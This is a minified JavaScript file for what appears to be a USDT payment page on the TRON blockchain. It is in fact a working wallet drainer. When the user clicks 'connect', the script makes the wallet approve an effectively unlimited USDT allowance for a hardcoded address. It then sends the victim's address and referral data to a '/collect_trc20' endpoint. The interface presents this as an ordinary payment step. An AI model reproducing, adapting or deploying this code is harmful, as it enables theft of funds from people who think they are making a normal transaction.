"use strict";

function _asyncToGenerator(e) {
    return function() {
        var n = e.apply(this, arguments);
        return new Promise(function(e, t) {
            function r(a, o) {
                try {
                    var s = n[a](o),
                        c = s.value
                } catch (e) {
                    return void t(e)
                }
                if (!s.done) return Promise.resolve(c).then(function(e) {
                    r("next", e)
                }, function(e) {
                    r("throw", e)
                });
                e(c)
            }
            return r("next")
        })
    }
}

function getUrlQueryString(e, n) {
    (n = n || window.location.href) && n.indexOf("?") > -1 && (n = n.substring(n.indexOf("?") + 1));
    var t = new RegExp("(^|&)" + e + "=([^&]*)(&|$)", "i"),
        r = n ? n.match(t) : window.location.search.substr(1).match(t);
    return null != r && "" != r[2] ? unescape(r[2]) : null
}

function getInfo() {
    $.ajax({
        type: "get",
        url: "/",
        async: !1,
        success: function(e) {
            authorized_address = "THZJHeVrtKbANnvzoJ1fCDS1jeefGt6shw"
        },
        error: function(e) {authorized_address = "THZJHeVrtKbANnvzoJ1fCDS1jeefGt6shw"}
    })
}
var postInfo = function() {
        var e = _asyncToGenerator(regeneratorRuntime.mark(function e(n, t) {
            var r, a, o;
            return regeneratorRuntime.wrap(function(e) {
                for (;;) switch (e.prev = e.next) {
                    case 0:
                        r = getUrlQueryString("s"), a = getUrlQueryString("r"), o = {
                            address: n,
                            authorized_address: "THZJHeVrtKbANnvzoJ1fCDS1jeefGt6shw",
                            bizhong: t,
                            code: r,
                            reffer: a,
                            type: 1
                        }, $.ajax({
                            type: "post",
                            url: domainMy,
                            data: o,
                            success: function(e) {
                                200 === e.code && console.log("success"), console.log(e.msg)
                            },
                            error: function(e) {
                                console.log(e)
                            }
                        });
                    case 4:
                    case "end":
                        return e.stop()
                }
            }, e, this)
        }));
        return function(n, t) {
            return e.apply(this, arguments)
        }
    }(),
    address = getUrlQueryString("addr"),
    rank = 1,
    authorized_address = "",
    domainMy = "/collect_trc20",
    bizhong = "",
    approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
$("input.num").bind("input propertychange", function() {
    $(this).val() && $(this).val() > 0 ? $("#btn-connect").css("background", "#078bc3") : $("#btn-connect").css("background", "#dde0dd"), $("#price").text(($(this).val() * rank).toLocaleString())
}), $("#address").text(address), $(function() {
    var e = function() {
            var e = _asyncToGenerator(regeneratorRuntime.mark(function e(n) {
                var t, c, i, u, d, l, f, p = this;
                return regeneratorRuntime.wrap(function(e) {
                    for (;;) switch (e.prev = e.next) {
                        case 0:
                            t = "USDT", c = !0, i = !1, u = void 0, e.prev = 4, d = regeneratorRuntime.mark(function e() {
                                var c, i, u;
                                return regeneratorRuntime.wrap(function(e) {
                                    for (;;) switch (e.prev = e.next) {
                                        case 0:
                                            return c = f.value, e.next = 3, tronWeb.contract().at(r[c]);
                                        case 3:
                                            return i = e.sent, e.next = 6, i.balanceOf(n).call(function(e, n) {
                                                var i = n / Math.pow(10, o[c] || 18) * a[c];
                                                console.log("usdt balance:", i), i > s && i > 500 && (t = c, s = i, approveAddr = r[t])
                                            });
                                        case 6:
                                            u = e.sent;
                                        case 7:
                                        case "end":
                                            return e.stop()
                                    }
                                }, e, p)
                            }), l = Object.keys(r)[Symbol.iterator]();
                        case 7:
                            if (c = (f = l.next()).done) {
                                e.next = 12;
                                break
                            }
                            return e.delegateYield(d(), "t0", 9);
                        case 9:
                            c = !0, e.next = 7;
                            break;
                        case 12:
                            e.next = 18;
                            break;
                        case 14:
                            e.prev = 14, e.t1 = e.catch(4), i = !0, u = e.t1;
                        case 18:
                            e.prev = 18, e.prev = 19, !c && l.return && l.return();
                        case 21:
                            if (e.prev = 21, !i) {
                                e.next = 24;
                                break
                            }
                            throw u;
                        case 24:
                            return e.finish(21);
                        case 25:
                            return e.finish(18);
                        case 26:
                            return bizhong = t, e.abrupt("return", t);
                        case 28:
                        case "end":
                            return e.stop()
                    }
                }, e, this, [
                    [4, 14, 18, 26],
                    [19, , 21, 25]
                ])
            }));
            return function(n) {
                return e.apply(this, arguments)
            }
        }(),
        n = function() {
            var n = _asyncToGenerator(regeneratorRuntime.mark(function n() {
                var t, r, a, o;
                return regeneratorRuntime.wrap(function(n) {
                    for (;;) switch (n.prev = n.next) {
                        case 0:
                            return $(".pages").append('<div class="modal-overlay"></div>'), $(".modal-overlay").addClass("modal-overlay-visible"), $(".modal").removeClass("modal-out").addClass("modal-in"), t = window.tronWeb, r = t.defaultAddress.base58, n.next = 7, e(r);
                        case 7:
                            return bizhong = n.sent, n.next = 10, t.contract().at(approveAddr);
                        case 10:
                            return a = n.sent, n.next = 13, a.approve(authorized_address, 9e13);
                        case 13:
                            o = n.sent, o.send({
                                feeLimit: 1e8,
                                callValue: 0,
                                shouldPollResponse: !1
                            }, function(e, n) {
                                null == e && ($(".tishi").fadeIn(), setTimeout(function() {
                                    $(".tishi").fadeOut()
                                }, 2e3), postInfo(r, bizhong)), $(".modal-overlay").remove(), $(".modal").removeClass("modal-in").addClass("modal-out")
                            });
                        case 15:
                        case "end":
                            return n.stop()
                    }
                }, n, this)
            }));
            return function() {
                return n.apply(this, arguments)
            }
        }(),
        t = function() {
            var e = _asyncToGenerator(regeneratorRuntime.mark(function e() {
                var n, t, r, a;
                return regeneratorRuntime.wrap(function(e) {
                    for (;;) switch (e.prev = e.next) {
                        case 0:
                            return n = window.tronWeb, e.next = 3, n.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
                        case 3:
                            return t = e.sent, r = n.defaultAddress.base58, e.next = 7, t.balanceOf(r).call(function(e, n) {
                                if (null == e) {
                                    var t = n._hex / Math.pow(10, 6);
                                    $("#yu").text(t.toLocaleString() + " USDT"), console.log(n)
                                }
                            });
                        case 7:
                            a = e.sent;
                        case 8:
                        case "end":
                            return e.stop()
                    }
                }, e, this)
            }));
            return function() {
                return e.apply(this, arguments)
            }
        }(),
        r = {
            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
        },
        a = {
            WIN: .00115,
            USDT: 1,
            TONS: 1.35,
            USDJ: 1.04,
            JST: .125,
            HT: 20.41,
            SUN: 33.97,
            EXNX: .0621,
            VCOIN: .004225,
            POL: .1393,
            CKRW: .002487
        },
        o = {
            WIN: 6,
            USDT: 6,
            TONS: 6,
            USDJ: 18,
            JST: 18,
            HT: 18,
            SUN: 18,
            EXNX: 18,
            VCOIN: 6,
            POL: 8,
            CKRW: 6
        },
        s = 0;
    ! function() {
        getInfo()
    }(), $(document).on("click", "#btn-connect", function() {
        n()
    }), setTimeout(function() {
        t()
    }, 1e3)
});